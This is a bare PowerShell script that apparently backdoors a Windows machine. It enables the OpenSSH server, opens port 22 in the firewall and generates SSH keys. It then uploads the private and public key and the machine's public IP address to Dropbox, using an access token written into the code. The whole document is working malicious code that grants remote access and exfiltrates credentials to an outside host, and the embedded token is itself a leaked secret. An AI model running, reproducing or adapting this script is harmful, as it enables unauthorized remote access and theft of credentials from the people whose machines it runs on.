Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue | Select-Object Name, Enabled)) {
    Write-Output "Firewall Rule 'OpenSSH-Server-In-TCP' does not exist, creating it..."
    New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
} else {
    Write-Output "Firewall rule 'OpenSSH-Server-In-TCP' has been created and exists."
}
ssh-keygen
dropbox-upload.ps1
  
function DropBox-Upload {

[CmdletBinding()]
param (
	
[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
[Alias("f")]
[string]$SourceFilePath
) 
$DropBoxAccessToken = "sl.u.AFvg-Msta-ItWNG73ix7lAeyGcVb3x56EkCj5WV7NnK-rZE3pAkqbnR7s_kzwUcTYC-xJb1FYsiGA9dt5KGdaoOY4fNhyVm5Xo50BsypQzYnk4UqGBQqTNWpAbCEPNANrV6uWu_3dWNxu-IHqFfBOrDH-mmpQatOCXxDM6o_6hwUo47akFcP7wMPMFFnB84wpQyl9MWxZruYJFMazhwMT_TangKS6pKv8mzkR_xKy9cnNfmdcTrziEb9LSwtdAJk2hrHzD8KagqvZR9lpYqAHYlHIO3W73AWkVc1MHw_LrOR2SZq7ZShUvTQFltYZpqVOJWd-V1CXROEgJqXExj89TX71trSh09oPYNBibs-66JpTO0AP3q5pmOex7Am_-WvPBDEzIBR-4oeIAoZarAfVNeCqdN4FWNGyuuIwwO8Hb4EkB03dQlQI4CmauTQRnrhuUUpDTLQIYOR5Mqz8NH36vgcqiYdosCIv976cGrthxA3yYxeoVL5Mk682nJVrf-vwE3W3hH3mtaT1vKaZc-1hrk8CmmkN2HkPz4rBlJtCLO9CpVdodKoC6oOkjOVAjiHwnJem1-7RMBl_5H524Lbb4XKq8ogDnDsYX78KVv7EPGTtau54UrnWyPSp9wFqarYvHewFA3-2QSjA0cC7sWENREGi9h3U5ByXeKzJrYHcfiJ9m26emepdR0SP1ATVuTYeqb0wFr2yeUbeo5_NGUa1FTsHieXD8JvDMEf8rvOfFpbUGKIE_lLmeTwxq9bSv6RwxlUJB9AY9UWQ6xFdK67AAX8FFUKBR-kDurjEgYS2pwFIBM-DgesB8wKAYBVQ8q_iY1ovsIa_IixkPh7L9a1-PlIx2bbpHAiBJLNWUR8pMdDVhdYC0XfBxhJgT-thw5STvIxLJPYTPOUbiXm_VgdCDV51btjA7Z3VAzNLnocHpDvwBx4Ycs2A32zJYiDuHWZaORW2mYCPaSAxBHOVS-wBZdXJpWC9uBr7zq6-vmC3TlaN5-ZSEFl-uFyzlnWVQ3QBTBetaO1Ev5e1hE_36oJ5FRU81UqF5Jo9FvXlAF4XVTDchtWYrE693vCD1psBNfbH0vHQDgvEnHs1-CjkAFmSor9EK2SZSZI4hq-0pXrxA48USKKIR1luWwloRfv_d7_gs1tUNTrf80VZO6mv9aPVtl2YCKze-DFsxq5OY5Tftc7fb7rQJQKF6Ai3QNGo6gtKuUwzbbPy-Ltm2dJR9o6rwH2m2FeRQpPO5dtuXiloH0mMu2SZUceB3YiUEN5RQ3hMjHLpzfeKXW7KrC-lt8WauSD"
$outputFile = Split-Path $SourceFilePath -leaf
$TargetFilePath="/$outputFile"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $DropBoxAccessToken
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}
$filename = "$env:USERPROFILE\.ssh\id_rsa"
$pub = "$env:USERPROFILE\.ssh\id_rsa.pub"

DropBox-Upload -FileName $filename
DropBox-Upload -FileName $pub
$currentip = Invoke-RestMethod -uri (“https://api.ipify.org/”)
$currentip | Out-File "C:\ip-$currentip.txt"
DropBox-Upload -FileName "C:\ip-$currentip.txt"
